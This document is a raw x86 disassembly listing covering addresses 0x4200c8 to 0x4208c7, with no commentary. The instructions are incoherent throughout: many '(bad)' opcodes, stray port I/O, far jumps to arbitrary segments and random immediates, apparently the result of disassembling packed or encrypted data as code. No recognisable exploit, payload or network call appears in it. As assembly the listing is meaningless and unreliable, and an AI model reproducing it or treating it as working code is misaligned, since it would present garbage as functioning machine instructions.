  4200c8:	xor    al,0x6c
  4200ca:	in     eax,dx
  4200cb:	daa    
  4200cc:	mov    bh,0x9a
  4200ce:	pusha  
  4200cf:	jo     0x4200c7
  4200d1:	(bad)  
  4200d2:	std    
  4200d3:	xor    edx,DWORD PTR [edi+0x69]
  4200d6:	fsub   DWORD PTR ds:[ebx+0x5271abd7]
  4200dd:	into   
  4200de:	mov    ecx,0x925e18ac
  4200e3:	mov    dh,0x4f
  4200e5:	jb     0x4200b2
  4200e7:	(bad)  
  4200e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200ea:	std    
  4200eb:	and    edx,ecx
  4200ed:	outs   dx,DWORD PTR ds:[esi]
  4200ee:	add    al,0x33
  4200f0:	arpl   WORD PTR [ebx+0x53614e36],cx
  4200f6:	dec    edx
  4200f7:	xchg   DWORD PTR [esp+edi*2+0x584aaba7],edi
  4200fe:	ror    DWORD PTR [edx+edi*4],1
  420101:	mov    eax,ds:0x57048574
  420106:	jl     0x4200b2
  420108:	sub    ecx,DWORD PTR [ebp-0x3b1869e9]
  42010e:	in     eax,dx
  42010f:	xchg   BYTE PTR [eax-0x4f4ba0ff],bl
  420115:	shl    ah,1
  420117:	push   eax
  420118:	fimul  DWORD PTR [ecx+0x6d]
  42011b:	ficomp WORD PTR [eax-0x2d]
  42011e:	sti    
  42011f:	push   0x24588e14
  420124:	in     al,dx
  420125:	retf   0x5564
  420128:	scas   eax,DWORD PTR es:[edi]
  420129:	mov    ds:0xf3242b3d,al
  42012e:	inc    ebp
  42012f:	psrad  mm1,mm4
  420132:	sub    al,0xc3
  420134:	jno    0x420150
  420136:	add    al,0x37
  420139:	sub    BYTE PTR [ebx-0x39],0x90
  42013d:	sbb    al,BYTE PTR cs:[ebx-0x2108734]
  420144:	cld    
  420145:	push   esi
  420146:	jnp    0x420195
  420148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420149:	mov    cl,0x4b
  42014b:	xchg   esi,eax
  42014c:	out    0xf7,al
  42014e:	xchg   BYTE PTR [ebx+0x2bcd5358],dl
  420154:	ret    0x3e3a
  420157:	push   ebp
  420158:	add    ch,BYTE PTR [esi+ebp*2]
  42015b:	nop
  42015c:	ret    0x596f
  42015f:	mov    ebp,esp
  420161:	pop    ss
  420162:	sbb    bh,0xa9
  420165:	in     eax,0x88
  420167:	popa   
  420168:	scas   al,BYTE PTR es:[edi]
  420169:	jno    0x4201cd
  42016b:	and    ecx,edi
  42016d:	ret    
  42016e:	jge    0x42011b
  420170:	popf   
  420171:	xor    BYTE PTR [edi+0xc],ah
  420174:	loop   0x4201a2
  420176:	push   es
  420177:	sub    edi,DWORD PTR [esi+0x62873b19]
  42017d:	les    ebx,FWORD PTR [eax+0x17052435]
  420183:	jl     0x42012c
  420185:	popf   
  420186:	ins    BYTE PTR es:[edi],dx
  420187:	jne    0x420127
  420189:	adc    eax,0x4be79225
  42018e:	test   al,0xd9
  420190:	mov    ds:0xb8fb95c7,al
  420195:	clc    
  420196:	jno    0x420118
  420198:	add    eax,0x206e89c3
  42019d:	cmp    DWORD PTR [esi+0x5f594b46],eax
  4201a3:	jg     0x420223
  4201a5:	sub    eax,esi
  4201a7:	pop    ecx
  4201a8:	sub    BYTE PTR [ebp-0xc6e483a],dl
  4201ae:	ss int 0xdd
  4201b1:	xchg   edi,eax
  4201b2:	lods   al,BYTE PTR ds:[esi]
  4201b3:	dec    eax
  4201b4:	mov    ebp,0xcd0cefc9
  4201b9:	fmul   QWORD PTR cs:[ecx-0x4867d682]
  4201c0:	fsubr  st(1),st
  4201c2:	dec    edx
  4201c3:	dec    ebp
  4201c4:	push   ebp
  4201c5:	jl     0x420240
  4201c7:	popa   
  4201c8:	jno    0x42016b
  4201ca:	imul   esp,ecx,0x2a9a02be
  4201d0:	shl    DWORD PTR [ecx-0x73],cl
  4201d3:	add    BYTE PTR [ebx],bh
  4201d5:	cmp    al,0xc2
  4201d7:	dec    esi
  4201d8:	jb     0x42024c
  4201da:	addr16 shl ah,1
  4201dd:	(bad)  
  4201de:	retf   
  4201df:	pop    esp
  4201e0:	xor    ecx,ecx
  4201e2:	sahf   
  4201e3:	ret    
  4201e4:	shl    BYTE PTR [eax-0x5c04742c],0xb2
  4201eb:	out    dx,eax
  4201ec:	mov    ebx,0xbd76aadf
  4201f1:	shr    BYTE PTR [ecx+0x7d],1
  4201f4:	inc    esi
  4201f5:	adc    esp,ecx
  4201f7:	push   ds
  4201f8:	mov    edx,0x5b93c0ab
  4201fd:	jae    0x4201c3
  4201ff:	lods   eax,DWORD PTR ds:[esi]
  420200:	test   al,0xe1
  420202:	out    dx,eax
  420203:	ds sbb eax,0x6ad00eea
  420209:	xor    DWORD PTR [ecx-0x50],0xffffff8d
  42020d:	push   es
  42020e:	std    
  42020f:	jmp    0x420199
  420211:	ja     0x420234
  420213:	adc    eax,0x4f6c2bfe
  420218:	xchg   ebp,eax
  420219:	jbe    0x420245
  42021b:	sub    ecx,DWORD PTR [eax+eiz*2-0x5392441]
  420222:	xchg   edx,eax
  420223:	or     edx,0xf012a863
  420229:	adc    ebp,DWORD PTR [esi-0x33252c2]
  42022f:	in     eax,0xe4
  420231:	popf   
  420232:	cmc    
  420233:	sub    al,0xfe
  420235:	sahf   
  420236:	dec    ebx
  420237:	mov    ch,0x61
  420239:	fbld   TBYTE PTR [edi]
  42023b:	xor    eax,0xba441fb6
  420240:	and    al,0xc8
  420242:	stos   BYTE PTR es:[edi],al
  420243:	(bad)  
  420244:	cli    
  420245:	into   
  420246:	stos   DWORD PTR es:[edi],eax
  420247:	fisttp WORD PTR [eax-0x55]
  42024a:	ret    
  42024b:	lds    esi,FWORD PTR [edi]
  42024d:	pop    ebp
  42024e:	xchg   ecx,eax
  42024f:	xlat   BYTE PTR fs:[ebx]
  420251:	in     al,0x7f
  420253:	repz dec edi
  420255:	out    dx,al
  420256:	(bad)  
  420257:	arpl   WORD PTR [edi-0x3cd297f4],cx
  42025d:	div    DWORD PTR [esi-0x4e6afaec]
  420263:	and    edx,esi
  420265:	je     0x420299
  420267:	cwde   
  420268:	dec    esi
  420269:	xor    al,0x2c
  42026b:	sbb    al,0x4f
  42026d:	pop    ecx
  42026e:	dec    ebp
  42026f:	ds ret 
  420271:	(bad)  
  420273:	pop    ecx
  420274:	jmp    0xf68b:0xa0e9a7ba
  42027b:	and    BYTE PTR [edi-0x5e5ce8b4],ah
  420281:	aas    
  420282:	sub    eax,0x3762a3e5
  420287:	mov    esp,DWORD PTR [edx+ebx*8+0x28eff59c]
  42028e:	nop
  42028f:	inc    edi
  420290:	and    dh,BYTE PTR [eax-0x2f]
  420293:	sbb    al,0x84
  420295:	test   BYTE PTR [esi+0x1e],0x18
  420299:	imul   edx,esp,0x9
  42029c:	push   ss
  42029d:	lods   al,BYTE PTR ds:[esi]
  42029e:	push   ebx
  42029f:	jns    0x4202c2
  4202a1:	adc    dl,BYTE PTR [eax+0x5b]
  4202a4:	adc    eax,0x307647d8
  4202a9:	hlt    
  4202aa:	sub    eax,0x646870e7
  4202af:	popf   
  4202b0:	push   ebx
  4202b1:	out    dx,eax
  4202b2:	mov    ch,0xa1
  4202b4:	and    ebp,DWORD PTR [ecx+0x38]
  4202b7:	leave  
  4202b8:	jb     0x420289
  4202ba:	and    ebp,DWORD PTR [eax+0xa]
  4202bd:	pop    esi
  4202be:	retf   
  4202bf:	or     esp,ebx
  4202c1:	sahf   
  4202c2:	rcl    BYTE PTR [esi],0x1b
  4202c5:	repz adc BYTE PTR [ebx+0x3c],0x1a
  4202ca:	jbe    0x4202ca
  4202cc:	call   0xedc90c26
  4202d1:	cmp    eax,0x5040b562
  4202d6:	inc    edx
  4202d7:	ret    0x29dd
  4202da:	or     BYTE PTR [eax],dh
  4202dc:	sar    DWORD PTR [ebx+0x2d],cl
  4202df:	cdq    
  4202e0:	cmp    bh,BYTE PTR [ebp-0x4b16ed41]
  4202e6:	jp     0x420304
  4202e8:	inc    esi
  4202e9:	in     eax,dx
  4202ea:	mov    eax,ecx
  4202ec:	sbb    al,0xcd
  4202ee:	imul   ebp,DWORD PTR [eax+eax*1+0x24],0x38432a8
  4202f6:	or     eax,0xfca1d5c4
  4202fb:	dec    esp
  4202fc:	fist   DWORD PTR ds:0xd5df4ace
  420302:	push   0x76
  420304:	sub    BYTE PTR [ebx+0x47],dl
  420307:	retw   
  420309:	out    0xed,eax
  42030b:	aam    0xd4
  42030d:	scas   eax,DWORD PTR es:[edi]
  42030e:	scas   al,BYTE PTR es:[edi]
  42030f:	out    0x72,al
  420311:	pop    ebx
  420312:	in     al,0x2c
  420314:	or     al,0xa7
  420316:	cmp    ebx,esi
  420318:	mov    ah,0xae
  42031a:	in     al,0x28
  42031c:	lods   eax,DWORD PTR ds:[esi]
  42031d:	sahf   
  42031e:	mov    al,0xa0
  420320:	cli    
  420321:	test   BYTE PTR [ebx+0x2dd8a809],cl
  420327:	and    bl,BYTE PTR [esi]
  420329:	jmp    0x5055:0xbce689e3
  420330:	dec    esi
  420331:	adc    DWORD PTR [ecx+0x28],esp
  420334:	pop    eax
  420335:	dec    edx
  420336:	gs fxch st(5)
  420339:	imul   edx,ebp,0x602897bb
  42033f:	sbb    al,bl
  420341:	mov    eax,ds:0x8f261bd4
  420346:	push   cs
  420347:	cmp    dl,BYTE PTR [eax]
  420349:	in     al,0xdd
  42034b:	(bad)  
  42034c:	retf   0xc162
  42034f:	(bad)  
  420350:	push   esi
  420351:	pusha  
  420352:	jl     0x4203af
  420354:	inc    edi
  420355:	cmp    edx,DWORD PTR [eax]
  420357:	(bad)  
  420358:	lds    esp,FWORD PTR fs:[ecx-0x6e]
  42035c:	adc    BYTE PTR [edx+0x20a75297],bh
  420362:	aaa    
  420363:	dec    edx
  420364:	call   0xe2d13e8
  420369:	inc    edx
  42036a:	test   eax,0x68d6752e
  42036f:	int    0x2c
  420371:	push   0xb54cc41c
  420376:	popf   
  420377:	jb     0x4203f7
  420379:	mov    ebx,0x40e0497c
  42037e:	and    ebp,DWORD PTR [ecx+0x7f]
  420381:	scas   eax,DWORD PTR es:[edi]
  420382:	aaa    
  420383:	shl    bl,0xb
  420386:	xchg   DWORD PTR [eax+edx*4-0x58],esp
  42038a:	jne    0x420376
  42038c:	xchg   edx,eax
  42038d:	xor    al,0x13
  42038f:	in     al,0x96
  420391:	and    ecx,esi
  420393:	dec    edx
  420394:	inc    eax
  420395:	stos   DWORD PTR es:[edi],eax
  420396:	push   cs
  420397:	mov    al,ds:0xa6c6cf0a
  42039c:	add    BYTE PTR [ecx+0x3d],ch
  42039f:	xlat   BYTE PTR ds:[ebx]
  4203a0:	aas    
  4203a1:	inc    eax
  4203a2:	in     eax,0x82
  4203a4:	stos   DWORD PTR es:[edi],eax
  4203a5:	stos   BYTE PTR es:[edi],al
  4203a6:	popa   
  4203a7:	cld    
  4203a8:	sbb    eax,0x5809c367
  4203ad:	ret    0x1ca7
  4203b0:	jp     0x42041a
  4203b2:	call   0xde59:0x8bdd6af8
  4203b9:	daa    
  4203ba:	mov    al,ds:0xd837668e
  4203bf:	sub    eax,0x55464d95
  4203c4:	dec    esi
  4203c5:	or     ch,BYTE PTR [ebx]
  4203c7:	mov    bh,0xad
  4203c9:	call   FWORD PTR [edx-0x80]
  4203cc:	cmp    DWORD PTR [ecx-0xf2e480f],0xffffffa7
  4203d3:	imul   esi,ecx,0xffffffaa
  4203d6:	mov    ds:0x16a1f562,al
  4203db:	pusha  
  4203dc:	xor    bh,dh
  4203de:	lods   al,BYTE PTR ds:[esi]
  4203df:	jne    0x42038a
  4203e1:	jne    0x420386
  4203e3:	or     edi,0xffffffda
  4203e6:	leave  
  4203e7:	popf   
  4203e8:	xor    bl,al
  4203ea:	lds    eax,FWORD PTR [edx-0x19155301]
  4203f0:	mov    ch,0xd8
  4203f2:	pop    ss
  4203f3:	aas    
  4203f4:	sub    al,0xa9
  4203f6:	and    bl,bh
  4203f8:	fisub  WORD PTR [ebp-0x1e]
  4203fb:	in     al,0xfe
  4203fd:	ja     0x42047b
  4203ff:	mov    BYTE PTR [ecx+0x119e6cf4],ah
  420405:	adc    edi,DWORD PTR [ebp+0x51]
  420408:	ds stos DWORD PTR es:[edi],eax
  42040a:	imul   ecx,ebx,0xcf8361ad
  420410:	clc    
  420411:	out    dx,al
  420412:	mov    ds:0x9875d1f7,al
  420417:	cmp    al,0x82
  420419:	mov    WORD PTR [ecx],ds
  42041b:	popf   
  42041c:	jns    0x420461
  42041e:	lahf   
  42041f:	(bad)
  420423:	popf   
  420424:	out    0x70,al
  420426:	mov    BYTE PTR [edi-0xe],al
  420429:	iret   
  42042a:	out    dx,eax
  42042b:	mov    edi,0x6b2a67a8
  420430:	fdivr  DWORD PTR [esi-0x36e0e9f]
  420436:	xor    BYTE PTR [eax-0x52e9033f],bl
  42043c:	mov    ebx,0xd85843e8
  420441:	scas   eax,DWORD PTR es:[edi]
  420442:	lahf   
  420443:	xchg   ebp,eax
  420444:	push   ebp
  420445:	pop    es
  420446:	sbb    al,0x3d
  420448:	out    0xd0,al
  42044a:	pop    edi
  42044b:	aas    
  42044c:	xor    eax,0xf706e9a
  420451:	cmp    esi,DWORD PTR [edx+ebp*4]
  420454:	mov    ecx,0x3a3b758c
  420459:	in     al,dx
  42045a:	push   ebp
  42045b:	imul   edx,DWORD PTR [ebx+0x76f55d33],0x43b9586d
  420465:	mov    es,eax
  420467:	addr16 pusha 
  420469:	in     al,0xfb
  42046b:	add    eax,0x32923f74
  420470:	mov    WORD PTR [ebx-0x7388909b],?
  420476:	out    dx,eax
  420477:	in     eax,dx
  420478:	repnz outs dx,BYTE PTR ds:[esi]
  42047a:	xor    al,0x54
  42047c:	pushf  
  42047d:	xchg   esi,eax
  42047e:	sbb    ah,BYTE PTR ds:0x7f4b0628
  420484:	push   0xfffffff9
  420486:	ins    DWORD PTR es:[edi],dx
  420487:	cmp    BYTE PTR ds:0x97cdfc95,cl
  42048d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42048e:	outs   dx,DWORD PTR ds:[esi]
  42048f:	add    dl,BYTE PTR [esi-0x14605114]
  420495:	mov    ebx,DWORD PTR [edx+edi*4]
  420498:	inc    esi
  420499:	bound  ecx,QWORD PTR [edx+ebx*4+0x4559fe86]
  4204a0:	fcom   QWORD PTR [edx+ecx*1-0x4e]
  4204a4:	push   cs
  4204a5:	arpl   WORD PTR [ebp-0x4fa0127a],si
  4204ab:	push   ds
  4204ac:	sbb    dh,bh
  4204ae:	scas   eax,DWORD PTR es:[edi]
  4204af:	fsubr  st(5),st
  4204b1:	outs   dx,BYTE PTR ds:[esi]
  4204b2:	int3   
  4204b3:	aad    0x5f
  4204b5:	rcr    DWORD PTR [esi],1
  4204b7:	retf   
  4204b8:	pop    eax
  4204b9:	pop    eax
  4204ba:	hlt    
  4204bb:	xor    eax,0xe40143b4
  4204c0:	imul   esp,ecx,0x5
  4204c3:	xchg   BYTE PTR [ebx+edi*4],ah
  4204c6:	aas    
  4204c7:	lahf   
  4204c8:	stos   DWORD PTR es:[edi],eax
  4204c9:	addr16 clc 
  4204cb:	xlat   BYTE PTR ds:[ebx]
  4204cc:	jne    0x420547
  4204ce:	out    dx,al
  4204cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204d0:	int    0x3d
  4204d2:	bound  ebx,QWORD PTR [ecx]
  4204d4:	jl     0x42048b
  4204d6:	fs cs ja 0x4204a8
  4204da:	mov    ecx,0x89de1162
  4204df:	jae    0x4204a4
  4204e1:	and    dh,BYTE PTR [ebp-0x4cbafb6d]
  4204e7:	sbb    BYTE PTR [esi+0x70ed8f0],bh
  4204ed:	stc    
  4204ee:	sbb    DWORD PTR ds:0x4dc5ab74,edx
  4204f4:	adc    DWORD PTR [esi-0x385b5820],edx
  4204fa:	sti    
  4204fb:	std    
  4204fc:	push   ecx
  4204fd:	inc    esp
  4204fe:	(bad)  
  4204ff:	push   0x54e249dd
  420504:	or     al,0xb7
  420507:	xchg   DWORD PTR [eax-0x1362ec41],ebx
  42050d:	add    eax,DWORD PTR [eax]
  42050f:	or     eax,DWORD PTR [edi+0x57e7c77c]
  420515:	in     eax,0xb4
  420517:	push   esp
  420518:	dec    edx
  420519:	xor    cl,0x16
  42051c:	dec    edx
  42051d:	fidivr WORD PTR [ebx-0x60]
  420520:	dec    eax
  420521:	cdq    
  420522:	add    dl,BYTE PTR [edx]
  420524:	mov    edx,0x4560c3b9
  420529:	imul   esp,DWORD PTR [edi],0xffffffd1
  42052c:	inc    edi
  42052d:	leave  
  42052e:	dec    ebp
  42052f:	popa   
  420530:	ror    BYTE PTR [eax-0x5a],1
  420533:	mov    edx,0xfcc14b4
  420538:	leave  
  420539:	lahf   
  42053a:	inc    ebp
  42053b:	pop    ds
  42053c:	sbb    dh,dl
  42053e:	fcmovne st,st(7)
  420540:	rcl    BYTE PTR [esi],0x99
  420543:	ds xchg esp,eax
  420545:	or     bh,ah
  420547:	pop    ebx
  420548:	push   ecx
  420549:	jmp    0x67a3870e
  42054e:	xchg   BYTE PTR [ebx-0x5a27464c],dh
  420554:	dec    esp
  420555:	add    DWORD PTR [eax-0x49],esi
  420558:	bound  ebx,QWORD PTR [edi]
  42055a:	pop    esp
  42055b:	jle    0x42057d
  42055d:	pop    ss
  42055e:	popa   
  42055f:	and    ecx,eax
  420561:	push   0x44
  420563:	xor    bh,BYTE PTR [eax-0x71]
  420566:	jg     0x420594
  420568:	enter  0x4a12,0xd1
  42056c:	aam    0x89
  42056e:	out    dx,al
  42056f:	or     esp,esi
  420571:	int3   
  420572:	cmp    esi,DWORD PTR [ecx]
  420574:	adc    BYTE PTR [ebx+eiz*2+0x3],bl
  420578:	jp     0x420596
  42057a:	in     al,0x85
  42057c:	call   0x381a:0x679b6cdc
  420583:	getsec 
  420585:	xchg   ch,al
  420587:	int    0x85
  420589:	lock cmp dl,dh
  42058c:	in     al,dx
  42058d:	loopne 0x42056e
  42058f:	(bad)  
  420590:	stos   DWORD PTR es:[edi],eax
  420591:	xlat   BYTE PTR ds:[ebx]
  420592:	rcl    ch,0xd3
  420595:	popa   
  420596:	in     al,0x13
  420598:	add    esp,ecx
  42059a:	mov    ebx,0xd1a5d3ef
  42059f:	mov    ebp,0xb5b4d0dd
  4205a4:	aaa    
  4205a5:	fsubr  QWORD PTR [ecx]
  4205a7:	cmp    BYTE PTR [ebx],ah
  4205a9:	(bad)  
  4205aa:	fcomp  QWORD PTR [eax+eiz*4-0x47]
  4205ae:	sbb    DWORD PTR [esi+0x5147f977],ebx
  4205b4:	int    0x5f
  4205b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205b7:	push   ebx
  4205b8:	dec    edx
  4205b9:	pop    edi
  4205ba:	xchg   edi,eax
  4205bb:	rcr    DWORD PTR ds:0xcb57dafd,1
  4205c1:	es nop
  4205c3:	les    eax,FWORD PTR [eax]
  4205c5:	jmp    0x420587
  4205c7:	add    eax,0xd49c0d30
  4205cc:	adc    DWORD PTR [ebp+eax*2-0x67d11ba0],eax
  4205d3:	jb     0x4205db
  4205d5:	push   edx
  4205d6:	fisubr WORD PTR [ebx+0x56]
  4205d9:	loopne 0x420608
  4205db:	lods   al,BYTE PTR ds:[esi]
  4205dc:	sti    
  4205dd:	dec    eax
  4205de:	cld    
  4205df:	icebp  
  4205e0:	push   ss
  4205e1:	sbb    eax,0x678fa136
  4205e6:	xor    DWORD PTR [eax+eiz*4],edx
  4205e9:	mov    DWORD PTR [edx],edi
  4205eb:	push   esp
  4205ec:	push   DWORD PTR [ebx]
  4205ee:	and    ebx,DWORD PTR [ebx-0x41bf31df]
  4205f4:	cmp    al,0x9f
  4205f6:	fild   QWORD PTR ds:[edi]
  4205f9:	cvtdq2ps xmm2,XMMWORD PTR [ecx-0x2b]
  4205fd:	mov    edx,0xa29dbc3e
  420602:	mov    ebx,0x3f937b4c
  420607:	pop    ebx
  420608:	sub    ebp,ecx
  42060a:	mov    cl,0xff
  42060c:	xor    DWORD PTR [ecx-0x14f949d7],edx
  420612:	shl    BYTE PTR [edx+0x49],0x1
  420616:	jbe    0x42065b
  420618:	mov    DWORD PTR [edx+0x4d],eax
  42061b:	ficomp WORD PTR [bx+si+0x34]
  42061f:	inc    edx
  420620:	in     al,dx
  420621:	imul   eax,DWORD PTR [ebx+0x72],0x2f176749
  420628:	int    0xfc
  42062a:	jecxz  0x420660
  42062c:	popf   
  42062d:	push   edi
  42062e:	cli    
  42062f:	pop    esp
  420630:	jg     0x420652
  420632:	adc    DWORD PTR [ebx+0x4d],0x26
  420636:	mov    bl,0x25
  420638:	inc    edi
  420639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42063a:	in     al,0x4b
  42063c:	adc    al,0x4f
  42063e:	lods   al,BYTE PTR ds:[esi]
  42063f:	loopne 0x4205de
  420641:	dec    ecx
  420642:	bound  esp,QWORD PTR [edi-0x28]
  420645:	sbb    al,0x91
  420647:	add    dl,BYTE PTR [edi-0x1]
  42064a:	sub    eax,0xeb52ccb9
  42064f:	push   0x6e6c344e
  420654:	xchg   esp,edx
  420656:	push   esp
  420657:	xchg   edi,eax
  420658:	aam    0xc1
  42065a:	out    0x6d,eax
  42065c:	push   ecx
  42065d:	cmp    dh,al
  42065f:	adc    BYTE PTR [ecx+0x43],0x4b
  420663:	mov    BYTE PTR ds:0xfeea5ec2,bh
  420669:	push   ds
  42066a:	jecxz  0x42061d
  42066c:	repnz ror eax,1
  42066f:	inc    esi
  420670:	mov    ds:0xbbbe7dcb,eax
  420675:	adc    DWORD PTR cs:[ebx-0x1eb67da],ecx
  42067c:	mov    eax,0xfbfaaaf0
  420681:	mov    cl,0x35
  420683:	push   ebp
  420684:	rol    DWORD PTR [eax-0x389441c6],1
  42068a:	gs push edx
  42068c:	inc    esp
  42068d:	leave  
  42068e:	xchg   BYTE PTR [eax+0x1a5f0048],cl
  420694:	cmp    al,0xde
  420696:	mov    dh,0x87
  420698:	sub    DWORD PTR [edx-0x50b6c9e0],esp
  42069e:	push   cs
  42069f:	sub    al,0x66
  4206a1:	add    BYTE PTR [ecx+0x6f],0x18
  4206a5:	(bad)  
  4206a6:	lods   al,BYTE PTR ds:[esi]
  4206a7:	cwde   
  4206a8:	jmp    0x420701
  4206aa:	pop    ds
  4206ab:	icebp  
  4206ac:	or     BYTE PTR [esi+ebp*2],dl
  4206af:	cmp    ah,bh
  4206b1:	cdq    
  4206b2:	cmc    
  4206b3:	inc    edx
  4206b4:	adc    al,0xc0
  4206b6:	pop    ebp
  4206b7:	ror    BYTE PTR [eax+0x44],0xdd
  4206bb:	sub    BYTE PTR [ebx],ch
  4206bd:	icebp  
  4206be:	fstp   QWORD PTR [edi+0x30]
  4206c1:	fldenv [ecx]
  4206c3:	ror    ebx,0xbf
  4206c6:	xchg   BYTE PTR [ebx-0x6c],cl
  4206c9:	fiadd  DWORD PTR [esi-0x26]
  4206cc:	ja     0x42071b
  4206ce:	or     al,0x31
  4206d0:	pushf  
  4206d1:	cs push edx
  4206d3:	pop    esi
  4206d4:	or     BYTE PTR [eax+0x1d],bh
  4206d7:	add    BYTE PTR [esi-0x3e7f1c8b],bl
  4206dd:	adc    esi,DWORD PTR [ebp+0x5908f74b]
  4206e3:	lods   al,BYTE PTR ds:[esi]
  4206e4:	add    BYTE PTR [edx],ah
  4206e6:	hlt    
  4206e7:	adc    eax,0x130f015a
  4206ec:	and    BYTE PTR [esi-0x43b4e0ab],0x4c
  4206f3:	dec    ebx
  4206f4:	add    bl,ah
  4206f6:	les    ebx,FWORD PTR [eax+0x27cea7e2]
  4206fc:	pop    esi
  4206fd:	add    DWORD PTR [edx-0x71094bf5],edx
  420703:	jbe    0x4206c8
  420705:	push   ebx
  420706:	adc    DWORD PTR [ebx+0x50],0x10322422
  42070d:	push   eax
  42070e:	aad    0x6
  420710:	das    
  420711:	push   0x3656829e
  420716:	inc    edx
  420717:	lods   eax,DWORD PTR ds:[esi]
  420718:	sbb    DWORD PTR [ecx],edx
  42071a:	ror    DWORD PTR [eax+0x35aea7cc],1
  420720:	xor    DWORD PTR [ebx],edx
  420722:	in     al,0xe
  420724:	and    edx,0x7292cdb6
  42072a:	popf   
  42072b:	sub    eax,0xea6742cb
  420730:	nop
  420731:	dec    ebp
  420732:	(bad)  
  420733:	mov    dl,0x5e
  420735:	sub    DWORD PTR [eax-0x91e7b67],0x6e
  42073c:	sub    al,BYTE PTR [esi-0x40717093]
  420742:	jb     0x42079c
  420744:	fwait
  420745:	in     al,dx
  420746:	dec    ebx
  420747:	push   es
  420748:	fcmovnbe st,st(2)
  42074a:	lahf   
  42074b:	mov    esp,0x89411758
  420750:	jbe    0x4207c2
  420752:	add    al,0x45
  420754:	xchg   BYTE PTR [ecx+0x28fd6c],dh
  42075a:	cmc    
  42075b:	test   ecx,esp
  42075d:	dec    edx
  42075e:	pushf  
  42075f:	test   eax,0xc8d7b8fe
  420764:	(bad)  
  420765:	repnz mov esi,0x8ed1adda
  42076b:	or     DWORD PTR [ebp-0x14a7fbe4],esp
  420771:	pop    esi
  420772:	dec    esp
  420773:	je     0x4207df
  420775:	fs loope 0x42078a
  420778:	(bad)  
  420779:	lock jge 0x42074b
  42077c:	pop    ecx
  42077d:	loope  0x420783
  42077f:	outs   dx,BYTE PTR ds:[esi]
  420780:	lea    esp,[ecx+ebx*1]
  420783:	jge    0x420735
  420785:	xor    eax,0xe1df2eba
  42078a:	lods   al,BYTE PTR ds:[esi]
  42078b:	add    bl,BYTE PTR [esi+0x33]
  42078e:	mov    eax,ds:0xe04b8b5
  420793:	cmp    eax,0xf0c0a63e
  420798:	(bad)  [esi+0x7b]
  42079b:	mov    ds,WORD PTR [edx+edx*1-0x79113771]
  4207a2:	sbb    eax,0x84a3ef3
  4207a7:	in     eax,0x75
  4207a9:	loope  0x420814
  4207ab:	aas    
  4207ac:	adc    eax,0x4adb4e31
  4207b1:	inc    esi
  4207b2:	mov    esi,0xfdbfd9c1
  4207b7:	add    eax,0x79c426ee
  4207bc:	sahf   
  4207bd:	outs   dx,DWORD PTR ds:[esi]
  4207be:	test   DWORD PTR [eax],0x6f10fe39
  4207c4:	mov    BYTE PTR [edx-0x71],dh
  4207c7:	pop    ds
  4207c8:	mov    ecx,0x35a41707
  4207cd:	mov    dl,0xe7
  4207cf:	add    eax,0xeccd808e
  4207d4:	pop    ebx
  4207d5:	mov    DWORD PTR [eax+0x41],eax
  4207d8:	or     dh,0x77
  4207db:	sahf   
  4207dc:	das    
  4207dd:	dec    ebp
  4207de:	add    DWORD PTR [eax+0x18],ecx
  4207e1:	mov    eax,ds:0x573b019
  4207e6:	mov    WORD PTR ds:0xb94cdf45,fs
  4207ec:	jmp    0x2c60:0x882b92e8
  4207f3:	iret   
  4207f4:	pop    edx
  4207f5:	pusha  
  4207f6:	adc    eax,0x5e47fb6
  4207fb:	jmp    0x63f4:0x63f49840
  420802:	ficomp WORD PTR [ebx+0x6d]
  420805:	cmp    al,0x28
  420807:	dec    edi
  420808:	aam    0x87
  42080a:	pop    edx
  42080b:	shl    BYTE PTR [ebp-0x29],1
  42080e:	cmp    ah,bh
  420810:	dec    eax
  420811:	in     al,dx
  420812:	sub    BYTE PTR [edi+0x6eb53a72],0xd5
  420819:	cmp    esi,DWORD PTR [edx-0x46710d7b]
  42081f:	imul   edi,eax,0xffffffcf
  420822:	pavgb  mm2,mm6
  420825:	jae    0x42082b
  420827:	and    BYTE PTR [edi],al
  420829:	les    edi,FWORD PTR [ecx-0x4e]
  42082c:	mov    bl,0xb3
  42082e:	add    eax,0x2d87d367
  420833:	or     eax,eax
  420835:	mov    ebx,0x178a3238
  42083a:	fwait
  42083b:	pop    es
  42083c:	into   
  42083d:	and    al,0xbc
  42083f:	push   ss
  420840:	adc    ebx,DWORD PTR [ecx+0x7ecf70fd]
  420846:	and    esp,esp
  420848:	out    0x68,al
  42084a:	inc    edx
  42084b:	mov    ebx,0xf68b4ac8
  420850:	stc    
  420851:	pop    edi
  420852:	push   edx
  420853:	prefetchw BYTE PTR [edi-0xe]
  420857:	sub    eax,0x76ee454c
  42085c:	rol    DWORD PTR [edi-0x49b8bf28],0xf9
  420863:	pop    edi
  420864:	shl    BYTE PTR [esp+eiz*4-0xf3a7ff0],cl
  42086b:	out    dx,eax
  42086c:	in     eax,dx
  42086d:	xor    al,0x8f
  42086f:	stc    
  420870:	jbe    0x42088b
  420872:	int    0xce
  420874:	stos   BYTE PTR es:[edi],al
  420875:	nop
  420876:	cmp    al,0xb6
  420878:	ror    ecx,1
  42087a:	fidiv  DWORD PTR ds:0xd7e65071
  420880:	push   ebp
  420881:	aam    0xf3
  420883:	cld    
  420884:	mov    bl,0xb7
  420886:	mov    ?,ebx
  420888:	sub    al,0x89
  42088a:	lods   al,BYTE PTR ds:[esi]
  42088b:	lock mov ch,0xf6
  42088e:	jae    0x420847
  420890:	leave  
  420891:	sub    al,0x2c
  420893:	pop    edi
  420894:	stos   BYTE PTR es:[edi],al
  420895:	fxch   st(1)
  420897:	or     bh,bh
  420899:	sbb    DWORD PTR [eax-0xfba6f9e],edi
  42089f:	mov    ebx,0x9b0ce40a
  4208a4:	mov    WORD PTR [eax+esi*8-0x26aeb29d],?
  4208ab:	lahf   
  4208ac:	push   ds
  4208ad:	pop    eax
  4208ae:	xor    eax,0xddd4624f
  4208b3:	ss dec edx
  4208b5:	popf   
  4208b6:	mulps  xmm3,XMMWORD PTR [ebx]
  4208b9:	jmp    0x5418:0x188a25bb
  4208c0:	loop   0x420924
  4208c2:	jecxz  0x42093b
  4208c4:	stos   BYTE PTR es:[edi],al
  4208c5:	and    al,0x33
  4208c7:	(bad)  
